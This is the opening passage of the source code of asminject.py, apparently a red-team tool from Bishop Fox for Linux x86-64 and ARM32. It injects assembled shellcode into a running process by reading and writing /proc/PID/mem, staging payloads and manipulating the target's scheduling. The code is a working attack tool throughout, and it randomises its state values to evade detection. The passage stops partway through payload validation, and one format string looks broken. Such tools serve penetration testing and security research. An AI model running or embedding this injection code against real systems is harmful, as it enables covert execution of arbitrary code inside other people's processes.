#!/usr/bin/env python3

f"Python version >= 3.6 required!"
# ^^^ fstrings are valid since python 3.6, will syntax error otherwise

BANNER = r"""
                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.18
Ben Lincoln, Bishop Fox, 2022-05-20
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject
"""

import argparse
import inspect
import math
import os
import psutil
import re
import secrets
import signal
import stat
import struct
import sys
import tempfile
import time
import subprocess

class asminject_parameters:
    def get_secure_random_not_in_list(self, max_value, list_of_existing_values):
        result = secrets.randbelow(max_value)
        while result in list_of_existing_values:
            result = secrets.randbelow(max_value)
        return result

    def randomize_state_variables(self):
        self.state_ready_for_shellcode_write = secrets.randbelow(self.state_variable_max)
        comparison_list = [self.state_ready_for_shellcode_write]
        self.state_shellcode_written = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_shellcode_written)
        self.state_ready_for_memory_restore = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_ready_for_memory_restore)
        self.state_memory_restored = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_memory_restored)

    def __init__(self):
        # x86-64: 8 bytes * 16 registers
        self.stack_backup_size = 8 * 16
        
        # CPU register width in bytes
        self.register_size = 8
        self.register_size_format_string = 'Q'
        
        self.communication_address_offset = -40
        self.communication_address_backup_size = 24
        # 512 is the minimum for the x86-64 fxsave instruction
        self.cpu_state_size = 1024
        # Might need to make this dynamic based on the stack backup size
        self.existing_stack_backup_location_size = 2048
        self.existing_stack_backup_location_offset = 1024
        self.new_stack_size = 2048
        self.new_stack_location_offset = 1024
        self.arbitrary_read_write_data_size = 2048
        self.arbitrary_read_write_data_location_offset = 0
        # When allocating memory, use blocks evenly divisible by this amount:
        self.allocation_unit_size = 0x1000
        # Should probably validate that this is big enough to hold everything
        self.stage2_size = 0x8000
        # Should probably validate that these are big enough to hold everything
        self.read_execute_block_size = 0x8000
        self.read_write_block_size = 0x8000
        
        # number of seconds the stage 1 and stage 2 code should sleep
        # every iteration they are waiting for something
        self.stage_sleep_seconds = 1
        
        # For "slow" mode
        self.high_priority_nice = -20
        self.low_priority_nice = 20

        self.sleep_time_waiting_for_syscalls = 0.1
        self.max_address_npic_suggestion = 0x00400000
        
        # More than anyone will ever intentionally use
        # But low enough that the script will time out in a reasonable amount of time if there's an infinite loop
        self.max_fragment_recursion = 1000
        
        # Making this slightly more than 1 second so that it should be impossible
        # For the stage/shellcode and the script to get stuck in a state where 
        # They're exactly out of sync
        self.wait_delay = 1.1
        self.restore_delay = 0.0
        
        # Randomized from initial state to make detection more challenging
        self.state_variable_max = 0xFFFFFF
        self.state_ready_for_shellcode_write = 47
        self.state_shellcode_written = self.state_ready_for_shellcode_write * 2
        self.state_ready_for_memory_restore = self.state_ready_for_shellcode_write * 3
        self.state_memory_restored = self.state_ready_for_shellcode_write * 4
        self.randomize_state_variables()
        
        self.base_script_path = ""
        self.pid = -1
        self.asm_path = ""
        self.relative_offsets = {}
        self.non_pic_binaries = []
        self.architecture = ""
        self.stop_method="sigstop"
        self.ansi=True
        self.pause_before_resume = False
        self.pause_before_launching_stage2 = False
        self.pause_before_memory_restore = False
        self.pause_after_memory_restore = False
        self.precompiled_shellcode = None
        self.custom_replacements = {}
        self.delete_temp_files = True
        self.freeze_dir = "/sys/fs/cgroup/freezer/" + secrets.token_bytes(8).hex()
        self.fragment_directory_name = "fragments"
        
        self.asminject_pid = None
        self.asminject_priority = None
        self.asminject_priority_original = None
        self.target_priority = None
        self.target_priority_original = None
        self.asminject_affinity = None
        self.asminject_affinity_original = None
        self.target_affinity = None
        self.target_affinity_original = None
        self.target_process = None
        self.shared_affinity = None
        
        self.shellcode_section_delimiter = "SHELLCODE_SECTION_DELIMITER"
        self.precompiled_shellcode_label = "precompiled_shellcode"
        self.post_shellcode_label = "post_shellcode_section"
        self.inline_shellcode_placeholder = "[VARIABLE:INLINE_SHELLCODE:VARIABLE]"
        
        self.enable_debugging_output = False
        
        self.instruction_pointer_register_name = "RIP"
        self.stack_pointer_register_name = "RSP"
        
        # deallocate the r/w memory allocated by stage 1 when stage 2 is about to exit
        # haven't come up with a way to deallocate the r/x memory
        self.deallocate_memory = True
        # If these values are not None, then stage 1 will use the specified locations 
        # for read/write and/or read/execute purposes
        # to avoid repeated allocate/deallocate operations and memory leak if injecting
        # into the same process repeatedly
        self.existing_read_write_address = None
        self.existing_read_execute_address = None
        
    def set_dynamic_process_info_vars(self):
        self.target_process = psutil.Process(self.pid)
        self.asminject_pid = os.getpid()
        self.asminject_process = psutil.Process(self.asminject_pid)
        self.asminject_priority = self.asminject_process.nice()
        self.target_priority = self.target_process.nice()
        self.asminject_affinity = self.asminject_process.cpu_affinity()
        self.target_affinity = self.target_process.cpu_affinity()
        
        # Only set these the first time
        if not self.asminject_priority_original:
            self.asminject_priority_original = self.asminject_priority
        if not self.target_priority_original:
            self.target_priority_original = self.target_priority
        if not self.asminject_affinity_original:
            self.asminject_affinity_original = self.asminject_affinity
        if not self.target_affinity_original:
            self.target_affinity_original = self.target_affinity
        if not self.shared_affinity:
            if len(self.asminject_affinity) == 1:
                self.shared_affinity = self.asminject_affinity
            else:
                self.shared_affinity = [self.asminject_affinity[0]]

    def set_architecture(self, architecture_string):
        self.architecture = architecture_string
        
        if self.architecture == "x86-64":
            self.register_size = 8
            self.register_size_format_string = 'Q'
            # 8 bytes * 16 registers
            self.stage_sleep_seconds = 2
            self.stack_backup_size = 8 * 16
            self.instruction_pointer_register_name = "RIP"
            self.stack_pointer_register_name = "RSP"
        if self.architecture == "arm32":
            self.register_size = 4
            self.register_size_format_string = 'L'
            # 4 bytes * 13 registers
            #self.stack_backup_size = 4 * 12
            self.stack_backup_size = 8 * 16
            # ARM32 doesn't seem to trigger the Linux "in a syscall" state
            # for long enough for the script to catch unless this value is 
            # around 5 seconds.
            #self.stage_sleep_seconds = 5
            self.stage_sleep_seconds = 2
            self.instruction_pointer_register_name = "pc"
            self.stack_pointer_register_name = "sp"

class communication_variables:
    def __init__(self):
        self.state_value = None
        self.read_execute_address = None
        self.read_write_address = None

def ansi_color(name):
    color_codes = {
        "blue": 34,
        "red": 91,
        "orange": 209,
        "green": 32,
        "default": 39,
    }
    return f"\x1b[{color_codes[name]}m"


def log(msg, color="blue", symbol="*", ansi=True):
    if ansi:
        print(f"{ansi_color(color)}[{symbol}]{ansi_color('default')} {msg}")
    else:
        print(f"[{symbol}] {msg}")


def log_success(msg, ansi=True):
    log(msg, "green", "+", ansi)

def log_warning(msg, ansi=True):
    log(msg, "orange", "-", ansi)

def log_error(msg, ansi=True):
    log(msg, "red", "!", ansi)
    #raise Exception(msg)


def assemble(source, injection_params, library_bases, replacements = {}):
    formatted_source = source
    for lname in library_bases.keys():
        if injection_params.enable_debugging_output:
            log(f"Library base entry: '{lname}'", ansi=injection_params.ansi)
    
    # Recursively replace any fragment references with actual file content
    fragment_refs_found = True
    recursion_count = 0
    recursion_count_list = {}
    while fragment_refs_found:
        found_this_iteration = 0
        fragment_placeholders = []
        fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', formatted_source)
        for match in fragment_placeholders_matches:
            fragment_file_name = match.group(2)
            if fragment_file_name in recursion_count_list.keys():
                recursion_count_list[fragment_file_name] += 1
            else:
                recursion_count_list[fragment_file_name] = 1
            if fragment_file_name not in fragment_placeholders:
                if injection_params.enable_debugging_output:
                    log(f"Found code fragment placeholder '{fragment_file_name}' in assembly code", ansi=injection_params.ansi)
                fragment_placeholders.append(fragment_file_name)
        for fragment_file_name in fragment_placeholders:
            fragment_file_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, injection_params.fragment_directory_name, fragment_file_name)
            if not os.path.isfile(fragment_file_path):
                log_error(f"Could not find the assembly source code fragment '{fragment_file_path}' referenced in the payload", ansi=injection_params.ansi)
                return None
            try:
                with open(fragment_file_path, "r") as fragment_source_file:
                    fragment_source = fragment_source_file.read()
                    string_to_replace = f"[FRAGMENT:{fragment_file_name}:FRAGMENT]"
                    if injection_params.enable_debugging_output:
                        log(f"Replacing '{string_to_replace}' with the content of file '{fragment_file_path}' in assembly code", ansi=injection_params.ansi)
                    formatted_source = formatted_source.replace(string_to_replace, fragment_source)
            except Exception as e:
                log_error(f"Could not read assembly source code fragment '{fragment_file_path}' referenced in the payload: {e}", ansi=injection_params.ansi)
                return None
        if len(fragment_placeholders) == 0:
            fragment_refs_found = False
        else:
            recursion_count += 1
            if recursion_count > injection_params.max_fragment_recursion:
                recursion_reference_string = ""
                recursion_reference_keys = []
                for rck in recursion_count_list.keys():
                    if rck not in recursion_reference_keys:
                        recursion_reference_keys.append(rck)
                recursion_reference_keys.sort()
                for ref_key in recursion_reference_keys:
                    new_key_string = f"{ref_key}: {recursion_count_list:ref_key} references"
                    if recursion_reference_string == "":
                        recursion_reference_string = new_key_string
                    else:
                        recursion_reference_string = f"{recursion_reference_string}, {new_key_string}"
                log_error(f"Reached maximum recursion count of {injection_params.max_fragment_recursion} while importing assembly code fragments. This is usually due to a reference loop, such as fragment A referencing fragment B, while fragment B also references fragment A. The fragment files with the highest counts in the following list are most likely responsible: {recursion_reference_string}", ansi=injection_params.ansi)
                return None
    
    for rname in replacements.keys():
        if injection_params.enable_debugging_output:
            log(f"Replacement key: '{rname}', value '{replacements[rname]}'", ansi=injection_params.ansi)  
    
    # Replace base address regex matches
    lname_placeholders = []
    lname_placeholders_matches = re.finditer(r'(\[BASEADDRESS:)(.*?)(:BASEADDRESS\])', formatted_source)
    for match in lname_placeholders_matches:
        placeholder_regex = match.group(2)
        if placeholder_regex not in lname_placeholders:
            if injection_params.enable_debugging_output:
                log(f"Found library base address regex placeholder '{placeholder_regex}' in assembly code", ansi=injection_params.ansi)
            lname_placeholders.append(placeholder_regex)
    for lname_regex in lname_placeholders:
        found_library_match = False
        for lname in library_bases.keys():
            #if injection_params.enable_debugging_output:
            #    log(f"Checking '{lname}' against library base address regex placeholder '{lname_regex}' from assembly code", ansi=injection_params.ansi)
            if re.search(lname_regex, lname):
                log(f"Using '{lname}' for library base address regex placeholder '{lname_regex}' in assembly code", ansi=injection_params.ansi)
                replacements[f"[BASEADDRESS:{lname_regex}:BASEADDRESS]"] = f"{hex(library_bases[lname]['base'])}"
                found_library_match = True
                break
        if not found_library_match:
            log_error(f"Could not find a match for the library base address regular expression '{lname_regex}' in the list of libraries loaded by the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload.", ansi=injection_params.ansi)
            return None
    #for fname in injection_params.relative_offsets.keys():
    #    replacements[f"[RELATIVEOFFSET:{fname}:RELATIVEOFFSET]"] = f"{hex(injection_params.relative_offsets[fname])}"   
    
    # Replace relative offset regex matches
    r_offset_placeholders = []
    r_offset_placeholders_matches = re.finditer(r'(\[RELATIVEOFFSET:)(.*?)(:RELATIVEOFFSET\])', formatted_source)
    for match in r_offset_placeholders_matches:
        r_offset_placeholder_regex = match.group(2)
        if r_offset_placeholder_regex not in r_offset_placeholders:
            if injection_params.enable_debugging_output:
                log(f"Found relative offset regex placeholder '{r_offset_placeholder_regex}' in assembly code", ansi=injection_params.ansi)
            r_offset_placeholders.append(r_offset_placeholder_regex)
    for r_offset_regex in r_offset_placeholders:
        found_offset_match = False
        for r_offset in injection_params.relative_offsets.keys():
            #if injection_params.enable_debugging_output:
            #    log(f"Checking '{r_offset}' against relative offset regex placeholder '{r_offset_regex}' from assembly code", ansi=injection_params.ansi)
            if re.search(f"^{r_offset_regex}$", r_offset):
                log(f"Using '{r_offset}' for relative offset regex placeholder '{r_offset_regex}' in assembly code", ansi=injection_params.ansi)
                replacements[f"[RELATIVEOFFSET:{r_offset_regex}:RELATIVEOFFSET]"] = f"{hex(injection_params.relative_offsets[r_offset])}"
                found_offset_match = True
                break
        if not found_offset_match:
            log_error(f"Could not find a match for the relative offset regular expression '{r_offset_regex}' in the list of relative offsets provided to asminject.py. Make sure you've targeted the correct process, and provided accurate lists of any necessary relative offsets for the process.", ansi=injection_params.ansi)
            return None


    for search_text in replacements.keys():
        formatted_source = formatted_source.replace(search_text, replacements[search_text])
    
    # check for any remaining placeholders in the formatted source code
    placeholder_types = ['BASEADDRESS', 'RELATIVEOFFSET', 'VARIABLE']
    missing_values = []
    for pht in placeholder_types:
        missing_placeholders_matches = re.finditer(r'(\[' + pht + ':)(.*?)(:' + pht + '\])', formatted_source)
        for match in missing_placeholders_matches:
            missing_string = match.group(0)
            if missing_string not in missing_values:
                missing_values.append(missing_string)
                
    if injection_params.enable_debugging_output:
        log(f"Formatted assembly code:\n{formatted_source}", ansi=injection_params.ansi)
    
    if len(missing_values) > 0:
        log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}", ansi=injection_params.ansi)
        return None

    result = None

    try:
        (tf, out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
        os.close(tf)
        # # output file is chmodded 0777 so that the target process' user account can delete it if necessary as well as reading it
        # try:
            # os.chmod(out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        # except Exception as e:
            # log_warning(f"Couldn't set permissions on '{out_path}': {e}", ansi=injection_params.ansi)
        if injection_params.enable_debugging_output:
            log(f"Writing assembled binary to {out_path}", ansi=injection_params.ansi)
        #out_path = f"/tmp/assembled_{os.urandom(8).hex()}.bin"
        #cmd = "gcc -x assembler - -o {0} -nostdlib -Wl,--oformat=binary -m64 -fPIC".format()
        argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-Wl,--oformat=binary", "-m64", "-fPIC"]
        # ARM gcc doesn't support the raw binary output format, and it's necessary to pass -Wl,--build-id=none so 
        # that the linker doesn't include metadata that objcopy will misinterpret later
        # same for the -s option: including the debugging metadata causes objcopy to output a file with a huge
        # amount of empty space in it
        if injection_params.architecture == "arm32":
            argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-Wl,--build-id=none", "-s"]
            #argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-pie", "-Wl,--build-id=none", "-s"]

        program = formatted_source.encode()
        pipe = subprocess.PIPE

        if injection_params.enable_debugging_output:
            log(f"Assembler command: {argv}", ansi=injection_params.ansi)
        result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
        
        if result.returncode != 0:
            emsg = result.stderr.decode().strip()
            log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
            return None
        
        # ld for ARM won't emit raw binaries like it will for x86-32
        if injection_params.architecture == "arm32":
            try:
                (tf2, obj_out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
                os.close(tf2)
                try:
                    os.chmod(obj_out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
                except Exception as e:
                    log_warning(f"Couldn't set permissions on '{obj_out_path}': {e}", ansi=injection_params.ansi)
                log(f"Converting executable '{out_path}' to raw binary file {obj_out_path}", ansi=injection_params.ansi)
                argv = ["objcopy", "-O", "binary", out_path, obj_out_path]
                if injection_params.enable_debugging_output:
                    log(f"objdump command: {argv}", ansi=injection_params.ansi)
                result = subprocess.run(argv, stdout=pipe, stderr=pipe)
                
                if result.returncode != 0:
                    emsg = result.stderr.decode().strip()
                    log_error("objdump command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
                    return None
                
                if injection_params.delete_temp_files:
                    try:
                        os.remove(out_path)
                    except Exception as e:
                        log_error(f"Couldn't delete termporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
                
                out_path = obj_out_path
            except Exception as e:
                log_error(f"Couldn't convert assembler output to raw binary using objdump: {e}", ansi=injection_params.ansi)
                return None
        
    except Exception as e:
        log_error(f"Couldn't assemble code using gcc: {e}", ansi=injection_params.ansi)
        return None
        
    result_code = None
    try:
        if os.path.isfile(out_path):
            with open(out_path, "rb") as assembled_code:
                result_code = assembled_code.read()
    except Exception as e:
        log_error(f"Couldn't read assembled binary '{out_path}': {e}", ansi=injection_params.ansi)
        return None

    if injection_params.delete_temp_files:
        try:
            os.remove(out_path)
        except Exception as e:
            log_error(f"Couldn't delete temporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
    
    return result_code

def output_memory_block_data(injection_params, memory_block_name, memory_block):
    if not injection_params.enable_debugging_output:
        return
    output = f"{memory_block_name}:"
    num_blocks = int(math.ceil(float(len(memory_block)) / float(injection_params.register_size)))
    for block_num in range(0, num_blocks):
        block_data = "0x "
        num_sub_blocks = int(injection_params.register_size / 4)
        for sub_block_num in range(0, num_sub_blocks):
            sub_block_data = ""
            base_byte_num = (block_num * injection_params.register_size) + (sub_block_num * 4)
            for byte_num in range(0, 4):
                current_byte_num = base_byte_num + byte_num
                current_byte_data = 0
                if current_byte_num < len(memory_block):
                    current_byte_data = memory_block[current_byte_num]
                else:
                    current_byte_data = 0
                sub_block_data = f"{sub_block_data}{format(current_byte_data, '02x')}"
            block_data = f"{block_data} {sub_block_data}"
        block_data = block_data.strip()
        output = f"{output}\n\t{block_data}"
    log(output, ansi=injection_params.ansi)

def get_memory_map_data(injection_params):
    result = {}
    with open(f"/proc/{injection_params.pid}/maps") as maps_file:
        for line in maps_file.readlines():
            linesplit = line.split()
            ld_path = linesplit[-1]
            addr_split = linesplit[0].split("-")
            ld_base = int(addr_split[0], 16)
            ld_end = int(addr_split[1], 16)
            if ld_path not in result.keys():
                is_non_pic_binary = False
                for npb_pattern in injection_params.non_pic_binaries:
                    if re.search(npb_pattern, ld_path):
                        is_non_pic_binary = True
                        break
                result_entry = {}
                result_entry["access"] = linesplit[1]
                
                if is_non_pic_binary:
                    result_entry["base"] = 0
                    result_entry["end"] = ld_end
                    log_warning(f"Handling '{ld_path}' as non-PIC binary", ansi=injection_params.ansi)
                else:
                    result_entry["base"] = ld_base
                    result_entry["end"] = ld_end
                    if ld_base <= injection_params.max_address_npic_suggestion:
                        log_warning(f"'{ld_path}' has a base address of {ld_base}, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary \"{ld_path}\" to your asminject.py options.", ansi=injection_params.ansi)
                
                result[ld_path] = result_entry
    return result

def get_temp_file_name():
    (tf, result) = tempfile.mkstemp(suffix=None, dir=None, text=False)
    os.close(tf)
    return result
    
def get_syscall_values(injection_params, pid):
    result = {}
    syscall_data = ""
    syscall_vals = []
    result[injection_params.instruction_pointer_register_name] = 0
    result[injection_params.stack_pointer_register_name] = 0
    result["syscall_data"] = ""
    try:
        with open(f"/proc/{pid}/syscall") as syscall_file:
            syscall_data = syscall_file.read()
            result["syscall_data"] = syscall_data
            syscall_vals = syscall_data.split(" ")
        if " " in syscall_data:
            result[injection_params.instruction_pointer_register_name] = int(syscall_vals[-1][2:], 16)
            result[injection_params.stack_pointer_register_name] = int(syscall_vals[-2][2:], 16)
        else:
            log(f"Couldn't retrieve current syscall values", ansi=injection_params.ansi)
    except Exception as e:
        log_error(f"Couldn't retrieve current syscall values: {e}", ansi=injection_params.ansi)
    return result

def wait_for_communication_state(injection_params, pid, communication_address, wait_for_value):
    done_waiting = False
    data = communication_variables()
    if injection_params.enable_debugging_output:
        log(f"Waiting for value {hex(wait_for_value)} at communication address {hex(communication_address)}", ansi=injection_params.ansi)
    while not done_waiting:
        try:
            with open(f"/proc/{pid}/mem", "rb") as mem:
                syscall_data = ""
                try:
                    # check to see if stage 1 has given the OK to proceed
                    syscall_check_result = get_syscall_values(injection_params, pid)
                    instruction_pointer = syscall_check_result[injection_params.instruction_pointer_register_name]
                    stack_pointer = syscall_check_result[injection_params.stack_pointer_register_name]
                    sleep_this_iteration = True
                    if instruction_pointer != 0 and stack_pointer != 0:
                        if injection_params.enable_debugging_output:
                            log(f"{injection_params.stack_pointer_register_name} is {hex(stack_pointer)}", ansi=injection_params.ansi)
                        mem.seek(communication_address)
                        data.state_value = struct.unpack(injection_params.register_size_format_string, mem.read(injection_params.register_size))[0]
                        #mem.seek(communication_address + injection_params.register_size)
                        data.read_execute_address = struct.unpack(injection_params.register_size_format_string, mem.read(injection_params.register_size))[0]
                        data.read_write_address = struct.unpack(injection_params.register_size_format_string, mem.read(injection_params.register_size))[0]
                        if injection_params.enable_debugging_output:
                            log(f"State value at communication address {hex(communication_address)} is {hex(data.state_value)}", ansi=injection_params.ansi)
                            log(f"Read/execute block address at communication address {hex(communication_address)} + {hex(injection_params.register_size)} is {hex(data.read_execute_address)}", ansi=injection_params.ansi)
                            log(f"Read/write block address at communication address {hex(communication_address)} + {hex(injection_params.register_size * 2)} is {hex(data.read_write_address)}", ansi=injection_params.ansi)
                        
                        if data.state_value == wait_for_value:
                            if injection_params.enable_debugging_output:
                                log(f"Communications address value matches wait value {hex(wait_for_value)}", ansi=injection_params.ansi)
                            sleep_this_iteration = False
                            done_waiting = True
                        
                    if sleep_this_iteration:
                        log("Waiting for injected code to update the state value", ansi=injection_params.ansi)
                        time.sleep(injection_params.wait_delay)
                except Exception as e:
                    log_error(f"Couldn't get target process information: {e}, {syscall_data}", ansi=injection_params.ansi)
        except FileNotFoundError as e:
            log_error(f"Process {pid} disappeared during injection attempt - exiting", ansi=injection_params.ansi)
            sys.exit(1)
    return data

def output_process_priority_and_affinity(injection_params, state_name):
    log(f"{state_name} process priority for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_priority}", ansi=injection_params.ansi)
    log(f"{state_name} CPU affinity for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_affinity}", ansi=injection_params.ansi)
    log(f"{state_name} process priority for target process (PID: {injection_params.pid}) is {injection_params.target_priority}", ansi=injection_params.ansi)
    log(f"{state_name} CPU affinity for target process (PID: {injection_params.pid}) is {injection_params.target_affinity}", ansi=injection_params.ansi)

def set_process_priority_and_affinity(injection_params, asminject_priority, target_priority, asminject_affinity, target_affinity):
    log(f"Setting process priority for asminject.py (PID: {injection_params.asminject_pid}) to {asminject_priority}", ansi=injection_params.ansi)
    injection_params.asminject_process.nice(asminject_priority)
    log(f"Setting process priority for target process (PID: {injection_params.pid}) to {target_priority}", ansi=injection_params.ansi)
    injection_params.target_process.nice(target_priority)
    log(f"Setting CPU affinity for asminject.py (PID: {injection_params.asminject_pid}) to {asminject_affinity}", ansi=injection_params.ansi)
    injection_params.target_process.cpu_affinity(asminject_affinity)
    log(f"Setting CPU affinity for target process (PID: {injection_params.pid}) to {target_affinity}", ansi=injection_params.ansi)
    injection_params.target_process.cpu_affinity(target_affinity)

def asminject(injection_params):
    stage1 = None
        
    stage1_source_filename = "stage1-memory.s"
    stage1_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage1_source_filename)
    if not os.path.isfile(stage1_path):
        log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=injection_params.ansi)
        sys.exit(1)
        
    stage2_template_source_filename = "stage2-template.s"
    stage2_template_source_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage2_template_source_filename)
    if not os.path.isfile(stage2_template_source_path):
        log_error(f"Could not find the stage 2 template source code '{stage2_template_source_path}'", ansi=injection_params.ansi)
        sys.exit(1)

    if not os.path.isfile(injection_params.asm_path):
        log_error(f"Could not find the stage 2 shellcode file '{injection_params.asm_path}'", ansi=injection_params.ansi)
        sys.exit(1)
        
    if injection_params.precompiled_shellcode:
        if not os.path.isfile(injection_params.precompiled_shellcode):
            log_error(f"Could not find the precompiled binary shellcode file '{injection_params.precompiled_shellcode}'", ansi=injection_params.ansi)
            sys.exit(1)
    
    library_bases = get_memory_map_data(injection_params)
    library_names = []
    for lname in library_bases.keys():
        library_names.append(lname)
    library_names.sort()
    for lname in library_names:
        log(f"{lname}: {hex(library_bases[lname]['base'])}", ansi=injection_params.ansi)

    # Do basic setup first to perform a validation on the stage 2 code
    # (Avoids injecting stage 1 only to have stage 2 fail)
    communication_address = library_bases["[stack]"]["end"] + injection_params.communication_address_offset

    stage2_replacements = injection_params.custom_replacements
    # these values will stay the same even for the real assembly
    
    stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
    #stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
    #stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
    stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
    stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
    stage2_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
    stage2_replacements['[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_write_block_size}"
    stage2_replacements['[VARIABLE:READ_EXECUTE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_execute_block_size}"
    #stage2_replacements['[VARIABLE:SHELLCODE_SECTION_DELIMITER:VARIABLE]'] = f"{injection_params.shellcode_section_delimiter}"
    stage2_replacements['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.precompiled_shellcode_label}"
    stage2_replacements['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.post_shellcode_label}"
    # these values are placeholders - real values will be determined by result of stage 1
    stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
    #stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{injection_params.stage2_size}"
    stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(communication_address-injection_params.stack_backup_size)}"
    stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{communication_address}"
    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{communication_address}"

    stage2_source_code = ""
    shellcode_source_code = ""
    try:
        with open(stage2_template_source_path, "r") as asm_source_code_file:
            stage2_source_code = asm_source_code_file.read()
    except Exception as e:
        log_error(f"Couldn't read the stage 2 template source code file '{stage2_template_source_path}': {e}", ansi=injection_params.ansi)
        sys.exit(1)
    
    if injection_params.deallocate_memory:
        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", "[FRAGMENT:stage2-deallocate.s:FRAGMENT]")
    else:
        log_warning(f"Memory allocated by the staging code will not be deallocated after the payload executes", ansi=injection_params.ansi)
        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", "")
    
    try:
        with open(injection_params.asm_path, "r") as shellcode_source_code_file:
            shellcode_source_code = shellcode_source_code_file.read()
    except Exception as e:
        log_error(f"Couldn't read the stage 2 template source code file '{injection_params.asm_path}': {e}", ansi=injection_params.ansi)
        sys.exit(1)
    
    shellcode_source_code_split = shellcode_source_code.split(injection_params.shellcode_section_delimiter)
    
    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_SOURCE:VARIABLE]', shellcode_source_code_split[0])
    
    shellcode_data_section = ""
    if len(shellcode_source_code_split) > 1:
        shellcode_data_section = shellcode_source_code_split[1]

    if injection_params.precompiled_shellcode:
        try:
            with open(injection_params.precompiled_shellcode, "rb") as precompiled_shellcode_file:
                precompiled_payload = precompiled_shellcode_file.read()
                precompiled_shellcode_as_hex = ""
                for byte_num in range(0, len(precompiled_payload)):
                    if byte_num == 0:
                        precompiled_shellcode_as_hex = f"{hex(precompiled_payload[byte_num])}"
                    else:
                        precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, {hex(precompiled_payload[byte_num])}"
                
                #shellcode_data_section = f"{shellcode_data_section}\n{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}"
                shellcode_as_inline_bytes = f"{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}\n\n"
                shellcode_data_section = shellcode_data_section.replace(injection_params.inline_shellcode_placeholder, shellcode_as_inline_bytes)
                    
        except Exception as e:
            log_error(f"Couldn't read and embed the precompiled shellcode file '{injection_params.precompiled_shellcode}': {e}", ansi=injection_params.ansi)
            sys.exit(1)

    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_DATA:VARIABLE]', shellcode_data_section)

    log("Validating ability to assemble stage 2 code", ansi=injection_params.ansi)
